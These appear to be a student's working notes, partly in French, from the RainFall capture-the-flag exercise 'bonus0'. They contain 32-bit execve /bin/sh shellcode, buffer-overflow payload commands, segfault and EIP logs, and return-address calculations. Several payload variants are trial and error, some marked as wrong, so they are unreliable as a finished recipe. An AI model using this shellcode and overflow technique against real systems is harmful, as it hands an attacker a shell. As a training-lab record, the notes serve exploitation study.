Here is our shellcode (size 24)

```
\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80
```

### Payload

0xbffff71c --> address of v3 --> \x1c\xf7\xff\xbf
0xbffff70e --> address of buffer -> \x0e\xf7\xff\xbf
0xbffff74e --> address of buffer maybe wtf lol mdr --> \x4e\xf7\xff\xbf

```bash
(python -c 'print ("A" * 20)'; cat) | ./bonus0
```

````bash
(python -c 'print "A" * 20'; python -c 'print "B" * 19')  | ./bonus0```

```bash
(python -c 'print "A" * 20'; python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80\x1c\xf7\xff\xbf"')  | ./bonus0
````

\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0 --> 1ere partie shellcode
\x0b\xcd\x80 --> 2eme partie shellcode
'A' \* 13
\x0e\xf7\xff\xbf

```bash
(python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0"'; python -c 'print "\x0b\xcd\x80" + "A" * 11 + "\x4e\xf7\xff\xbf" + "A"'; cat)  | ./bonus0
```

run < <(python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0"'; python -c 'print "\x0b\xcd\x80" + "A" * 12 + "\x4e\xf7\xff\xbf" + "A"';)

LOG pour find segfault

```bash
bonus0@RainFall:~$ (python -c 'print "A" * 20'; python -c 'print "B" * 17')  | ./bonus0
 -
 -
AAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBB BBBBBBBBBBBBBBBBB
Segmentation fault (core dumped)
bonus0@RainFall:~$ (python -c 'print "A" * 20'; python -c 'print "B" * 16')  | ./bonus0
 -
 -
AAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBB BBBBBBBBBBBBBBBB
```

```
Wrong Payload
20 chars de payload

- 16 chars de payload
- overwrite return addresse --> jump vers debut de buffer (start of payload)
+ 16 chars de payload
+ overwrite return addresse --> jump vers debut de buffer (start of payload)
```

input1: 19 A || input2: 1B
--> AAAAAAAAAAAAAAAAAAA B
19 A | 1B

intput1 : 20 A || input2: 1 B
--> AAAAAAAAAAAAAAAAAAAAB B
20 A + 1B | 1B

input1: 20A || input2 : 5 B
--> AAAAAAAAAAAAAAAAAAAABBBBB BBBBB
20 A + 5B | 5B

```
input 1 = AAAAAAAAAAAAAAAAAAAA (20 CHARS)
input 2 = BBBBBBBBBBBBBBBB	(16 CHARS)		OK
--> AAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBB BBBBBBBBBBBBBBBB	(55 chars total)

input 2 = BBBBBBBBBBBBBBBBB	(17 CHARS)		SEGFAULT
--> AAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBB BBBBBBBBBBBBBBBBB	(55 chars total)
```

```bash
(python -c 'print "A" * 20'; python -c 'print "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A"')  | ./bonus0
```

```
segfault
0x	41	33	61	41
	A	3	a	A
```

`offset to segfault at 20 CHARS dans input1 et 9 CHARS in input 2`

```bash
Payload
20 chars de payload (-> input 1)
+ 9 chars de payload (-> input 2)
+ adress to start of payload (address of buffer in main)
+ ballec du reste?
```

```bash
SHELLCODE
\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80
```

```buffer
20 chars de
AAAAAAAAAAAAAAAAAAAABBBBBBBBBB BBBBBBBBBB
AAAAAAAAAAAAAAAAAAAABBBBBBBBBBB BBBBBBBBBBB
AAAAAAAAAAAAAAAAAAAABBBBBBBBBBBB BBBBBBBBBBBB
AAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBB BBBBBBBBBBBBBBB
```

---

## NEW PAYLAOD

```bash
input 1 = AAAAAAAAAAAAAAAAAAAA	(20 CHARS)

input 2 = BBBBBBBBBBBBBBBB		(16 CHARS)		OK
--> AAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBB BBBBBBBBBBBBBBBB		(55 chars total)

input 2 = BBBBBBBBBBBBBBBBB		(17 CHARS)		SEGFAULT
--> AAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBB BBBBBBBBBBBBBBBBB		(55 chars total)
eip            0xb7e40042	0xb7e40042

input 2 = BBBBBBBBBBBBBBBBBB	(18 CHARS)		SEGFAULT
--> AAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBB BBBBBBBBBBBBBBBBBB	(57 chars total)
eip            0x00424242	0x00424242

input 2 = BBBBBBBBBBBBBBBBBBB	(19 CHARS)		SEGFAULT
--> AAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBB BBBBBBBBBBBBBBBBBBB	(59 chars total)
eip            0x42424242	0x42424242

input 2 = BBBBBBBBBBCDEFGHIJK	(19 CHARS)		SEGFAULT
--> AAAAAAAAAAAAAAAAAAAABBBBBBBBBBCDEFGHIJK BBBBBBBBBBCDEFGHIJK	(59 chars total)
eip            0x4a494847	0x4a494847
4a	49	48	47
J	I	H	G

input 2 = 14 CHARS + EIP (4 chars) + 1 CHAR trash
input 1 = 20 CHARS

BUFFER = 
input 1 (20 chars)
+ input 2 ( 19 )
+ espace
+ input 2 (19)

BUFFER =

20 chars unique
+ 14 chars
+ EIP (4 chars)
+ 1 char trash
+ espace
+ 14 chars
+ EIP (4 chars) //celui la overflow
+ 1 char trash

PAYLOAD = 
input 1 = 20er char du shellcode
input 2 = 3 characters du shellcode + 11 trash + EIP (jump == 4 chars) + 1 trash

SHELLCODE


PAYLOAD
input 1 = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0"
input 2 = "\x0b\xcd\x80" + 11 * "A" + "\x06\xf7\xff\xbf" + "A"
input 2 = 
```

address of start of buffer: `0xbffff706` = `\x06\xf7\xff\xbf`

```bash
(python -c 'print ("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0")'; python -c 'print ("\x0b\xcd\x80" + 11 * "A" + "\x06\xf7\xff\xbf" + "A")'; cat)  | ./bonus0
```
-----

```bash
(python -c 'print ("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0")'; python -c 'print ("\x0b\xcd\x80" + 11 * "A" + "\xa0\x85\x04\x08" + "A")'; cat)  | ./bonus0
```

main - 4 = 080485a4 - 4 = 080485a0 = \xa0\x85\x04\x08